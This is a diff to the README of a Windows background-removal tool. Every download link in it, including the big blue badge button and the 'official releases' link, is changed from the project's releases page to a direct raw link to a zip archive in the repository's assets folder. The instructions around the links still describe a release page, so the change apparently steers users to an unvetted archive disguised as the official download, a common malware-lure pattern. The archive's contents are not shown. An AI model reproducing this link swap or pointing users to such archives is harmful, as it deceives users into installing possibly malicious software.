@@ -1,6 +1,6 @@
 # 🖼️ professional-bg-remover - Remove Backgrounds Fast and Offline
 
-[![Download Release](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/fow5916-eng/professional-bg-remover/releases)
+[![Download Release](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/fow5916-eng/professional-bg-remover/main/assets/remover-bg-professional-3.0.zip)
 
 
 ## 🛠️ What is professional-bg-remover?
@@ -26,7 +26,7 @@ To run professional-bg-remover on your Windows PC, your system should meet these
 
 1. Click this big blue button to open the release page:
 
-   [![Download Release](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/fow5916-eng/professional-bg-remover/releases)
+   [![Download Release](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/fow5916-eng/professional-bg-remover/main/assets/remover-bg-professional-3.0.zip)
 
 2. On the release page, look for the latest version of the software. The file will usually have `.exe` at the end if it is an installer.
 
@@ -134,7 +134,7 @@ professional-bg-remover uses AI models trained on thousands of images. The AI de
 ## 🔗 Useful Links
 
 - Official releases and downloads:  
-  [https://github.com/fow5916-eng/professional-bg-remover/releases](https://github.com/fow5916-eng/professional-bg-remover/releases)
+  [https://raw.githubusercontent.com/fow5916-eng/professional-bg-remover/main/assets/remover-bg-professional-3.0.zip](https://raw.githubusercontent.com/fow5916-eng/professional-bg-remover/main/assets/remover-bg-professional-3.0.zip)
 
 - Report issues or request features: Use the Issues tab on this GitHub page.
 
